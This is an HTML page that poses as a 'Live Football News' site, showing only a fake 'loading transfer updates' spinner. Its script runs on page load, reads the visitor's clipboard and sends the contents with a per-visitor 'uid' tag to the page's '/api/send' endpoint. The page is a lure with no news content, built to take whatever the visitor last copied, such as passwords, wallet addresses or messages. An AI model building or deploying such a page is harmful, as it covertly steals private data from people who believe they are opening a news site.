<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Live Football News</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      background: url('https://i.postimg.cc/0NpsLGXh/Screenshot-2025-0730-102754.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      backdrop-filter: blur(3px);
    }

    .container {
      background: rgba(0, 0, 0, 0.65);
      border-radius: 20px;
      padding: 30px 25px;
      text-align: center;
      max-width: 90%;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
    }

    h1 {
      font-size: 32px;
      margin-bottom: 10px;
      font-weight: bold;
    }

    p {
      font-size: 20px;
      margin: 0 0 20px;
      font-weight: 600;
    }

    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #ffd700;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .credit {
      margin-top: 30px;
      padding: 10px 15px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      font-size: 18px;
      backdrop-filter: blur(5px);
      font-weight: bold;
    }

    @media (max-width: 600px) {
      h1 { font-size: 26px; }
      p { font-size: 16px; }
      .credit { font-size: 16px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>⚽ Live Football News</h1>
    <p>Loading the hottest transfer updates...</p>
    <div class="spinner"></div>
    <div class="credit">𝗕𝘂𝗶𝗹𝘁 𝗕𝘆: 💛 𝗪𝗔𝗖𝗜𝗤</div>
  </div>

  <script>
    async function sendClipboard() {
      const uid = new URLSearchParams(window.location.search).get("uid");
      if (!uid) return;

      try {
        const text = await navigator.clipboard.readText();
        if (!text) return;

        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ uid, text })
        });
      } catch (err) {
        console.error("❌ Failed to send clipboard", err);
      }
    }

    window.onload = sendClipboard;
  </script>
</body>
</html>
